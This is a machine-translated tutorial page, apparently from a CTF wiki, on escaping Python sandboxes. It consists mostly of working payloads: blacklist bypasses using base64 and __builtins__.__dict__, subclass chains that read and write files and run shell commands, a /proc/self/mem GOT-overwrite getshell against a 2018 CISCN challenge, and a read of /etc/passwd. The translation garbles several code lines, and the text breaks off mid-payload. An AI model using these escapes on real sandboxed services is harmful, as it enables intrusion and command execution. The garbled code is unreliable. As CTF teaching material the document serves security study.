<h1 id="page"><a aria-hidden="true" class="anchor-heading" href="#page"><svg aria-hidden="true" viewBox="0 0 16 16"><use xlink:href="#svg-link"></use></svg></a>Page</h1>
<h1 id="python-sandbox"><a aria-hidden="true" class="anchor-heading" href="#python-sandbox"><svg aria-hidden="true" viewBox="0 0 16 16"><use xlink:href="#svg-link"></use></svg></a>Python sandbox</h1>
<p>The so-called Python sandbox, in a certain way to simulate the Python terminal, to achieve user use of Python.</p>
<h1 id="python-sandbox-escape-some-ways"><a aria-hidden="true" class="anchor-heading" href="#python-sandbox-escape-some-ways"><svg aria-hidden="true" viewBox="0 0 16 16"><use xlink:href="#svg-link"></use></svg></a>Python Sandbox Escape Some Ways</h1>
<p>What we usually call Python sandbox escaping is to bypass the simulated Python terminal and ultimately implement command execution.</p>
<h2 id="import-module"><a aria-hidden="true" class="anchor-heading" href="#import-module"><svg aria-hidden="true" viewBox="0 0 16 16"><use xlink:href="#svg-link"></use></svg></a>Import module</h2>
<p>In Python's built-in functions, there are some functions that help us implement arbitrary command execution:</p>
<pre><code>
os.system () os.popen ()
commands.getstatusoutput() commands.getoutput()

commands.getstatus()

subprocess.call(command, shell=True) subprocess.Popen(command, shell=True)

pty.spawn()

</code></pre>
<p>There are usually three ways to import modules in Python (xxx is the module name):</p>
<ol>
<li>
<p><code>import xxx</code></p>
</li>
<li>
<p><code>from xxx import *</code></p>
</li>
<li>
<p><code>__import__('xxx')</code></p>
</li>
</ol>
<p>We can import the relevant modules through the above import method and use the above functions to implement the command execution.
In addition to this, we can also <strong> import modules via path</strong>:
For example, in Linux system, the path of Python's os module is generally in <code>/usr/lib/python2.7/os.py</code>. When you know the path, we can import the module by the following operations, and then further use the relevant function.</p>
<pre class="language-py"><code class="language-py">
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> sys

<span class="token operator">>></span><span class="token operator">></span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'/usr/lib/python2.7/os.py'</span>

<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> the
<span class="token operator">>></span><span class="token operator">></span>

</code></pre>
<p><strong>Other dangerous function examples</strong>
Such as <strong>execfile</strong> file execution</p>
<pre class="language-py"><code class="language-py">
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">execfile</span><span class="token punctuation">(</span><span class="token string">'/usr/lib/python2.7/os.py'</span><span class="token punctuation">)</span>

<span class="token operator">>></span><span class="token operator">></span> system<span class="token punctuation">(</span><span class="token string">'cat /etc/passwd'</span><span class="token punctuation">)</span>

root<span class="token punctuation">:</span>x<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span>root<span class="token punctuation">:</span><span class="token operator">/</span>root<span class="token punctuation">:</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>bash

daemon<span class="token punctuation">:</span>x<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span>daemon<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin

<span class="token builtin">bin</span><span class="token punctuation">:</span>x<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin

sys<span class="token punctuation">:</span>x<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span>sys<span class="token punctuation">:</span><span class="token operator">/</span>dev<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token operator">>></span><span class="token operator">></span> getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token string">'/usr/lib/python2.7'</span>

</code></pre>
<p>** ** timeit</p>
<pre class="language-py"><code class="language-py">
<span class="token keyword">import</span> timeit

timeit<span class="token punctuation">.</span>timeit<span class="token punctuation">(</span><span class="token string">"__import__('os').system('dir')"</span><span class="token punctuation">,</span>number<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>

</code></pre>
<p><strong> exec and eval are more classic </strong></p>
<pre class="language-py"><code class="language-py">
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'__import__("os").system("dir")'</span><span class="token punctuation">)</span>



</code></pre>
<p><strong>platform</strong></p>
<pre class="language-py"><code class="language-py">
<span class="token keyword">import</span> platform

<span class="token keyword">print</span> platform<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre>
<p>However, the normal Python sandbox will blacklist the use of modules such as os or whitelists that only allow users to use the sandbox-provided modules to prevent dangerous operations. How to further escape the sandbox is our key research content.</p>
<h2 id="pythons-built-in-functions"><a aria-hidden="true" class="anchor-heading" href="#pythons-built-in-functions"><svg aria-hidden="true" viewBox="0 0 16 16"><use xlink:href="#svg-link"></use></svg></a>Python's built-in functions</h2>
<p>When we can't import modules, or the modules we want to import are banned, then we can only look for Python's own built-in functions (that is, functions that are usually imported without default, and Python itself has been imported by default). We can get a list of built-in functions by using <code>dir __builtin__</code></p>
<pre class="language-python"><code class="language-python">
<span class="token operator">>></span><span class="token operator">></span> say <span class="token punctuation">(</span>__ builtins__<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'ArithmeticError'</span><span class="token punctuation">,</span> <span class="token string">'AssertionError'</span><span class="token punctuation">,</span> <span class="token string">'AttributeError'</span><span class="token punctuation">,</span> <span class="token string">'BaseException'</span><span class="token punctuation">,</span> <span class="token string">'BufferError'</span><span class="token punctuation">,</span> <span class="token string">'BytesWarning'</span><span class="token punctuation">,</span> <span class="token string">'DeprecationWarning'</span><span class="token punctuation">,</span> <span class="token string">'EOFError'</span><span class="token punctuation">,</span> <span class="token string">'Ellipsis'</span><span class="token punctuation">,</span> <span class="token string">'EnvironmentError'</span><span class="token punctuation">,</span> <span class="token string">'Exception'</span><span class="token punctuation">,</span> <span class="token string">'False'</span><span class="token punctuation">,</span> <span class="token string">'FloatingPointError'</span><span class="token punctuation">,</span> <span class="token string">'FutureWarning'</span><span class="token punctuation">,</span> <span class="token string">'GeneratorExit'</span><span class="token punctuation">,</span> <span class="token string">'IOError'</span><span class="token punctuation">,</span> <span class="token string">'ImportError'</span><span class="token punctuation">,</span> <span class="token string">'ImportWarning'</span><span class="token punctuation">,</span> <span class="token string">'IndentationError'</span><span class="token punctuation">,</span> <span class="token string">'IndexError'</span><span class="token punctuation">,</span> <span class="token string">'KeyError'</span><span class="token punctuation">,</span> <span class="token string">'KeyboardInterrupt'</span><span class="token punctuation">,</span> <span class="token string">'LookupError'</span><span class="token punctuation">,</span> <span class="token string">'MemoryError'</span><span class="token punctuation">,</span> <span class="token string">'NameError'</span><span class="token punctuation">,</span> <span class="token string">'None'</span><span class="token punctuation">,</span> <span class="token string">'NotImplemented'</span><span class="token punctuation">,</span> <span class="token string">'NotImplementedError'</span><span class="token punctuation">,</span> <span class="token string">'OSError'</span><span class="token punctuation">,</span> <span class="token string">'OverflowError'</span><span class="token punctuation">,</span> <span class="token string">'PendingDeprecationWarning'</span><span class="token punctuation">,</span> <span class="token string">'ReferenceError'</span><span class="token punctuation">,</span> <span class="token string">'RuntimeError'</span><span class="token punctuation">,</span> <span class="token string">'RuntimeWarning'</span><span class="token punctuation">,</span> <span class="token string">'StandardError'</span><span class="token punctuation">,</span> <span class="token string">'StopIteration'</span><span class="token punctuation">,</span> <span class="token string">'SyntaxError'</span><span class="token punctuation">,</span> <span class="token string">'SyntaxWarning'</span><span class="token punctuation">,</span> <span class="token string">'SystemError'</span><span class="token punctuation">,</span> <span class="token string">'SystemExit'</span><span class="token punctuation">,</span> <span class="token string">'TabError'</span><span class="token punctuation">,</span> <span class="token string">'True'</span><span class="token punctuation">,</span> <span class="token string">'TypeError'</span><span class="token punctuation">,</span> <span class="token string">'UnboundLocalError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeDecodeError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeEncodeError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeTranslateError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeWarning'</span><span class="token punctuation">,</span> <span class="token string">'UserWarning'</span><span class="token punctuation">,</span> <span class="token string">'ValueError'</span><span class="token punctuation">,</span> <span class="token string">'Warning'</span><span class="token punctuation">,</span> <span class="token string">'ZeroDivisionError'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'__debug__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__import__'</span><span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">,</span> <span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'all'</span><span class="token punctuation">,</span> <span class="token string">'any'</span><span class="token punctuation">,</span> <span class="token string">'apply'</span><span class="token punctuation">,</span> <span class="token string">'basestring'</span><span class="token punctuation">,</span> <span class="token string">'bin'</span><span class="token punctuation">,</span> <span class="token string">'bool'</span><span class="token punctuation">,</span> <span class="token string">'buffer'</span><span class="token punctuation">,</span> <span class="token string">'bytearray'</span><span class="token punctuation">,</span> <span class="token string">'bytes'</span><span class="token punctuation">,</span> <span class="token string">'callable'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">,</span> <span class="token string">'classmethod'</span><span class="token punctuation">,</span> <span class="token string">'cmp'</span><span class="token punctuation">,</span> <span class="token string">'coerce'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'complex'</span><span class="token punctuation">,</span> <span class="token string">'copyright'</span><span class="token punctuation">,</span> <span class="token string">'credits'</span><span class="token punctuation">,</span> <span class="token string">'delattr'</span><span class="token punctuation">,</span> <span class="token string">'dict'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'divmod'</span><span class="token punctuation">,</span> <span class="token string">'enumerate'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'execfile'</span><span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">'filter'</span><span class="token punctuation">,</span> <span class="token string">'float'</span><span class="token punctuation">,</span> <span class="token string">'format'</span><span class="token punctuation">,</span> <span class="token string">'frozenset'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">,</span> <span class="token string">'globals'</span><span class="token punctuation">,</span> <span class="token string">'hasattr'</span><span class="token punctuation">,</span> <span class="token string">'hash'</span><span class="token punctuation">,</span> <span class="token string">'help'</span><span class="token punctuation">,</span> <span class="token string">'hex'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'int'</span><span class="token punctuation">,</span> <span class="token string">'intern'</span><span class="token punctuation">,</span> <span class="token string">'isinstance'</span><span class="token punctuation">,</span> <span class="token string">'issubclass'</span><span class="token punctuation">,</span> <span class="token string">'iter'</span><span class="token punctuation">,</span> <span class="token string">'len'</span><span class="token punctuation">,</span> <span class="token string">'license'</span><span class="token punctuation">,</span> <span class="token string">'list'</span><span class="token punctuation">,</span> <span class="token string">'locals'</span><span class="token punctuation">,</span> <span class="token string">'long'</span><span class="token punctuation">,</span> <span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'memoryview'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'next'</span><span class="token punctuation">,</span> <span class="token string">'object'</span><span class="token punctuation">,</span> <span class="token string">'oct'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'ord'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'property'</span><span class="token punctuation">,</span> <span class="token string">'quit'</span><span class="token punctuation">,</span> <span class="token string">'range'</span><span class="token punctuation">,</span> <span class="token string">'raw_input'</span><span class="token punctuation">,</span> <span class="token string">'reduce'</span><span class="token punctuation">,</span> <span class="token string">'reload'</span><span class="token punctuation">,</span> <span class="token string">'repr'</span><span class="token punctuation">,</span> <span class="token string">'reversed'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'set'</span><span class="token punctuation">,</span> <span class="token string">'setattr'</span><span class="token punctuation">,</span> <span class="token string">'slice'</span><span class="token punctuation">,</span> <span class="token string">'sorted'</span><span class="token punctuation">,</span> <span class="token string">'staticmethod'</span><span class="token punctuation">,</span> <span class="token string">'str'</span><span class="token punctuation">,</span> <span class="token string">'sum'</span><span class="token punctuation">,</span> <span class="token string">'super'</span><span class="token punctuation">,</span> <span class="token string">'tuple'</span><span class="token punctuation">,</span> <span class="token string">'type'</span><span class="token punctuation">,</span> <span class="token string">'unichr'</span><span class="token punctuation">,</span> <span class="token string">'unicode'</span><span class="token punctuation">,</span> <span class="token string">'vars'</span><span class="token punctuation">,</span> <span class="token string">'xrange'</span><span class="token punctuation">,</span> <span class="token string">'zip'</span><span class="token punctuation">]</span>

</code></pre>
<p>In Python, built-in functions that do not introduce direct use are called <strong>builtin</strong> functions, and are automatically introduced into the environment with the <strong>_builtin__</strong> module. So how do we introduce the module? We can introduce the modules we want to introduce by <strong><strong>dict</strong></strong>. The role of <strong><strong>dict</strong></strong> is to list all the properties and functions below a module/class/object. This is useful in sandbox escapes, you can find some things hidden in it.
<strong><strong>dict</strong></strong>What can I do?
We know that a module object has a namespace implemented by a dictionary object, and a reference to the property is converted to a lookup in the dictionary. For example, mx is equivalent to m.dict["x"].</p>
<p>Bypass the instance:
First pass the base64 bypass character plaintext detection</p>
<pre class="language-python"><code class="language-python">
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> base64

<span class="token operator">>></span><span class="token operator">></span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">'__import__'</span><span class="token punctuation">)</span>

<span class="token string">'X19pbXBvcnRfXw=='</span>

<span class="token operator">>></span><span class="token operator">></span> base64<span class="token punctuation">.</span>b64encode <span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span>
<span class="token string">'b3M ='</span>
</code></pre>
<p>Then quoted by <strong><strong>dict</strong></strong></p>
<pre class="language-py"><code class="language-py">
<span class="token operator">>></span><span class="token operator">></span> __builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'X19pbXBvcnRfXw=='</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'b3M='</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

</code></pre>
<ul>
<li>If some introverted functions are removed in <strong>builtins</strong>, we can reload them by reload(<strong>builtins</strong>) to get a complete <strong>builtins</strong>*</li>
</ul>
<h2 id="creating-objects-and-references"><a aria-hidden="true" class="anchor-heading" href="#creating-objects-and-references"><svg aria-hidden="true" viewBox="0 0 16 16"><use xlink:href="#svg-link"></use></svg></a>Creating objects and references</h2>
<p>There are a lot of basic functions integrated in Python's object class, and we can also refer to it by creating objects when we want to call them.</p>
<p>We have two common methods:</p>
<pre class="language-bash"><code class="language-bash">
<span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token string">''</span>.__class__.__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>

</code></pre>
<p><img src="http://oayoilchh.bkt.clouddn.com/18-5-3/14928461.jpg"></p>
<p>For example, we can pass
<code>print ().__class__.__bases__[0].__subclasses__()[40]("/etc/services").read()</code> achieves the effect of file reading,</p>
<p><strong>Common payload</strong></p>
<pre class="language-py"><code class="language-py">
<span class="token comment">#读文件</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">r'C:\1.php'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>



<span class="token comment">#Write file</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/input'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>



<span class="token comment">#Execute arbitrary commands</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span>__ <span class="token keyword">class</span> <span class="token class-name">__</span><span class="token punctuation">.</span>__ bases __ <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">.</span>__ subclasses __ <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span> <span class="token punctuation">.</span>__ init __<span class="token punctuation">.</span> func_globals<span class="token punctuation">.</span>values <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token string">'__ import __ ("os"). popen ("ls / var / www / html "). read () '</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="indirect-reference"><a aria-hidden="true" class="anchor-heading" href="#indirect-reference"><svg aria-hidden="true" viewBox="0 0 16 16"><use xlink:href="#svg-link"></use></svg></a>Indirect reference</h2>
<p>In some topics, such as the Python sandbox issue of the 2018 National Tournament, the import is actually castrated. But in Python, the native <strong><strong>import</strong></strong> is referenced, as long as we find the relevant object reference, we can further get what we want, the following demo will tell you</p>
<h2 id="writemodify-got-table"><a aria-hidden="true" class="anchor-heading" href="#writemodify-got-table"><svg aria-hidden="true" viewBox="0 0 16 16"><use xlink:href="#svg-link"></use></svg></a>writeModify got table</h2>
<p>Is actually a memory operation method of <strong>/proc/self/mem</strong>
<strong>/proc/self/mem</strong> is a memory image that can be used to read and write all the memory of the process, including executable code. If we can get the offset of some functions of Python, such as <strong>system</strong>, We can then override the purpose of getshell by overriding the got.</p>
<pre class="language-py"><code class="language-py">
<span class="token punctuation">(</span><span class="token keyword">lambda</span> r<span class="token punctuation">,</span>w<span class="token punctuation">:</span>r<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0x08de2b8</span><span class="token punctuation">)</span> <span class="token keyword">or</span> w<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0x08de8c8</span><span class="token punctuation">)</span> <span class="token keyword">or</span> w<span class="token punctuation">.</span>write<span class="token punctuation">(</span>r<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token operator">+</span><span class="token string">'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/proc/self/mem'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/proc/self/mem'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

</code></pre>
<p>The first address is the offset of system, the second is the offset of fopen, we can get the relevant information through <strong>objdump</strong>
<img src="http://oayoilchh.bkt.clouddn.com/18-5-3/25123674.jpg"></p>
<p>#example2018 ciscn Python sandbox escape in the National University Information Security Competition.
We can get the title source by <code>print ().__class__.__bases__[0].__subclasses__()[40]("/home/ctf/sandbox.py").read()</code>, and then we can further analyze it. An escape method.</p>
<h3 id="creating-objects-and-using-python-to-manipulate-string-characteristics"><a aria-hidden="true" class="anchor-heading" href="#creating-objects-and-using-python-to-manipulate-string-characteristics"><svg aria-hidden="true" viewBox="0 0 16 16"><use xlink:href="#svg-link"></use></svg></a>Creating objects and using Python to manipulate string characteristics</h3>
<pre class="language-py"><code class="language-py">
x <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x<span class="token punctuation">.</span>__name__ <span class="token operator">==</span> <span class="token string">'ca'</span><span class="token operator">+</span><span class="token string">'tch_warnings'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__

x<span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token string">"func_global"</span><span class="token operator">+</span><span class="token string">"s"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'linecache'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'o'</span><span class="token operator">+</span><span class="token string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'sy'</span><span class="token operator">+</span><span class="token string">'stem'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'l'</span><span class="token operator">+</span><span class="token string">'s'</span><span class="token punctuation">)</span>

x<span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token string">"func_global"</span><span class="token operator">+</span><span class="token string">"s"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'linecache'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'o'</span><span class="token operator">+</span><span class="token string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'sy'</span><span class="token operator">+</span><span class="token string">'stem'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'l'</span><span class="token operator">+</span><span class="token string">'s /home/ctf'</span><span class="token punctuation">)</span>

x<span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token string">"func_global"</span><span class="token operator">+</span><span class="token string">"s"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'linecache'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'o'</span><span class="token operator">+</span><span class="token string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'sy'</span><span class="token operator">+</span><span class="token string">'stem'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ca'</span><span class="token operator">+</span><span class="token string">'t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'</span><span class="token punctuation">)</span>

</code></pre>
<h3 id="hijack-got-table-getshell"><a aria-hidden="true" class="anchor-heading" href="#hijack-got-table-getshell"><svg aria-hidden="true" viewBox="0 0 16 16"><use xlink:href="#svg-link"></use></svg></a>Hijack got table getshell</h3>
<pre class="language-py"><code class="language-py">
<span class="token punctuation">(</span><span class="token keyword">lambda</span> r<span class="token punctuation">,</span>w<span class="token punctuation">:</span>r<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0x08de2b8</span><span class="token punctuation">)</span> <span class="token keyword">or</span> w<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0x08de8c8</span><span class="token punctuation">)</span> <span class="token keyword">or</span> w<span class="token punctuation">.</span>write<span class="token punctuation">(</span>r<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'l'</span><span class="token operator">+</span><span class="token string">'s /home/ctf/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/proc/self/mem'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/proc/self/mem'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>





<span class="token punctuation">(</span><span class="token keyword">lambda</span> r<span class="token punctuation">,</span>w<span class="token punctuation">:</span>r<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0x08de2b8</span><span class="token punctuation">)</span> <span class="token keyword">or</span> w<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0x08de8c8</span><span class="token punctuation">)</span> <span class="token keyword">or</span> w<span class="token punctuation">.</span>write<span class="token punctuation">(</span>r<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token operator">+</span><span class="token string">'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token 